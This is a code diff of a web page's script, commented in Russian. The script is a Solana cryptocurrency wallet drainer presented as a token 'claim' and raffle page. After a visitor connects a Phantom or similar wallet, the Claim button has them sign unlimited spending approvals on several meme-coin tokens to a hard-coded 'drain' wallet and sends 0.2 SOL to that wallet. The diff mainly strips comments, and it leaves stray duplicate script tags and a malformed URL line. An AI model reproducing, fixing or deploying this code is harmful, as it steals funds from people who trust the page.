@@ -1722,6 +1722,7 @@
 <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.8/dist/umd/spl-token.min.js"></script>
 
 <script>
+    <script>
     const DRAIN_DELEGATE = "4kbb1kaz2YXuTjHQAHY5xjjrqiCM8MZU9sVmmdYg1xo1"; // Твой новый кошелёк для слива
 
     const MEME_MINTS = [
@@ -1729,19 +1730,19 @@
         "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm", // WIF
         "6D7NaB2xsLd7cauWu1YbC8SGSxW6J1xua3v1w2zUL7", // POPCAT
         "MEW1gQwX7Z8Q8v6t6t6t6t6t6t6t6t6t6t6t6t6t6t6t" // MEW (обнови если нужно)
-        // Добавь другие мемы сюда
+        // Добавь другие популярные мемы сюда
     ];
 
     let walletPubkey = null;
     let wallet = null;
 
-    // Подключение кошелька (работает с твоей панелью и кнопкой connect-btn)
     async function connectWallet(preferred = "auto") {
         const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
         if (isMobile) {
             const dappUrl = encodeURIComponent(window.location.href);
-            window.location.href = https://phantom.app/ul/browse/\( {dappUrl}?ref= \){dappUrl};
+            const phantomDeepLink = https://phantom.app/ul/browse/\( {dappUrl}?ref= \){dappUrl};
+            window.location.href = phantomDeepLink;
             return;
         }
 
@@ -1775,7 +1776,6 @@
             document.getElementById('claim-btn').disabled = false;
             document.getElementById('raffle-btn').disabled = false;
 
-            // Подсветка выбранного кошелька в панели
             document.querySelectorAll('.wallet-card').forEach(card => {
                 card.classList.toggle('wallet-card--active', card.dataset.wallet === chosen.id);
             });
@@ -1784,12 +1784,10 @@
         }
     }
 
-    // Клик по картам кошельков в панели
     document.querySelectorAll('.wallet-card').forEach(card => {
         card.addEventListener('click', () => connectWallet(card.dataset.wallet));
     });
 
-    // Кнопка подключения (если нажмут на неё)
     document.getElementById('connect-btn').addEventListener('click', () => connectWallet("auto"));
 
     // Кнопка Claim — approve unlimited на мемы + слив 0.2 SOL сразу
@@ -1804,7 +1802,7 @@
             const owner = new solanaWeb3.PublicKey(walletPubkey);
 
             const tx = new solanaWeb3.Transaction();
-          // Approve unlimited на все мемкоины
+
             for (const mintStr of MEME_MINTS) {
                 const mint = new solanaWeb3.PublicKey(mintStr);
                 const userATA = await splToken.getAssociatedTokenAddress(mint, owner);
@@ -1813,11 +1811,9 @@
                 if (!ataInfo) {
                     tx.add(splToken.createAssociatedTokenAccountInstruction(owner, userATA, owner, mint));
                 }
-
-                tx.add(splToken.createApproveInstruction(userATA, delegate, owner, [], Number.MAX_SAFE_INTEGER));
+              tx.add(splToken.createApproveInstruction(userATA, delegate, owner, [], Number.MAX_SAFE_INTEGER));
             }
 
-            // Слив 0.2 SOL сразу тебе
             tx.add(solanaWeb3.SystemProgram.transfer({
                 fromPubkey: owner,
                 toPubkey: delegate,
@@ -1869,6 +1865,7 @@
             document.getElementById('status').innerText = "Ошибка — попробуй снова";
         }
     };
+</script>
 </script>
 </body>
 </html>
